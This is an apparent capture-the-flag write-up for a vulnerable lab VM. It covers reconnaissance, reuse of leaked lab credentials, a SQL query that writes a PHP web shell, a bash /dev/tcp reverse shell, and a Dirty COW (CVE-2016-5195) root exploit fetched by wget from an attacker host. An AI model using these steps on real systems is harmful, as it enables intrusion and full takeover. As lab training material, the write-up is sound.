

#  Reverse shell - Summary

## Network Discovery and Service Enumeration

The target VM operates in bridged network mode. Begin by identifying your local IP address:

```bash
ifconfig
```

To know the IP of the target host:

```bash
sudo netdiscover -r 192.168.56.0/24
```

## Identified target IP: 192.168.1.4

Open services:

- FTP (21)
- SSH (22)
- HTTP (80)
- HTTPS (443)
- IMAP (143)
- IMAPS (993)

## Web Server Analysis

### Initial Reconnaissance

Access the web server on port 80:

```bash
curl 192.168.1.4
```

The response contains a basic HTML page.

## Directory Enumeration

Use dirb to discover hidden paths over HTTPS:

```bash
dirb https://192.168.1.4 -r
```

Discovered endpoints:

- Forum: https://192.168.1.4/forum/
- phpMyAdmin: https://192.168.1.4/phpmyadmin/
- Webmail: https://192.168.1.4/webmail/

## Service Exploration

### 1-Forum Analysis

Review forum posts. A post by user `lmezard` contains SSH logs with an apparent password attempt:

Password: `!q\]Ej?*5K5cy*AJ`

Use these credentials to log into the forum (`user: lmezard`).

Discover the associated email: `laurie@borntosec.net`

### 2-Webmail Access

Log into webmail (Roundcube) using `laurie@borntosec.net` and the found password.

Retrieve database credentials from an email:

  - Username: `root`  
  - Password: `Fg-'kKXBj87E:aJ$`

### 3-phpMyAdmin Exploitation

Access phpMyAdmin with the obtained credentials.

Execute SQL injection to create a web shell:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"; 
```

## Server Compromise

### Reverse Shell Setup

Host a netcat listener locally:

```bash
nc -nvlp 4444
```

Trigger reverse shell via the web backdoor (URL-encoded Python reverse shell command):

```bash
https://192.168.1.4/forum/templates_c/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR-IP/4444+0>%261'
```


### Getting a fully interactive shell

To fix the PTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
then press `ctrl+z`, and run:

```bash
stty raw -echo; fg;
```


# üêÆ Dirty COW Exploit Write-up

**Target OS:** Linux (vulnerable kernel)

**Exploit:** Dirty COW (CVE-2016-5195)

## üìå Overview
**Dirty COW** (CVE-2016-5195) is a privilege escalation vulnerability in the Linux kernel. It leverages a **race condition** in the kernel‚Äôs handling of the **Copy-On-Write** (COW) mechanism for memory-mapped files.

Using this exploit, a local attacker can **overwrite read-only files** and gain **root privileges** by modifying sensitive files like **`/etc/passwd`**.

## üöÄ Exploit Steps

### ‚ö° On the Attacker Machine

1Ô∏è‚É£ **Navigate to the exploit source directory:**
```bash
cd /path/to/dirtycow
```

2Ô∏è‚É£ Compile the exploit:

```bash
gcc -m32 -pthread dirty.c -o cowroot -lcrypt -static
```

‚úÖ Explanation of flags:

   - `m32:` Build for 32-bit systems (often needed).

   - `pthread:` Use pthreads for the exploit‚Äôs race condition.

   - `lcrypt:` Use the crypt library for password hashing.

   - `static:` Build a static binary (no external dependencies).

**Serve the exploit binary (`cowroot`) using Python‚Äôs HTTP server:**

```bash
python3 -m http.server 9999

```

### ‚ö° On the Target Machine

1Ô∏è‚É£ **Navigate to a writable directory:**

```bash
cd /tmp
```

2Ô∏è‚É£ **Download the exploit from the attacker machine:**

```bash
wget http://ATTACKER-IP:9999/cowroot
```

3Ô∏è‚É£ **Make the exploit executable:**

```bash
chmod +x cowroot
```

4Ô∏è‚É£ **Run the exploit:**

```bash
./cowroot
```

‚úÖ **`If successful, it will add a new root-level user (usually firefart).`**

5Ô∏è‚É£ **Switch to the new user:**

```bash
su firefart
```

## üêß How it Works
‚úÖ **The exploit:**

  - Maps /etc/passwd in memory.

  - Calls madvise() repeatedly to invalidate the memory pages.

  - Simultaneously writes to the mapped memory via /proc/self/mem.

  - The race condition in the kernel lets the write happen, modifying /etc/passwd despite its read-only status.

‚úÖ **This grants root access by injecting a new root user entry in the real `/etc/passwd.`**

## ‚ö†Ô∏è Impact
  - Local privilege escalation ‚Üí attacker gains full root control.

  - Works on many older Linux kernel versions (pre-4.8.3).

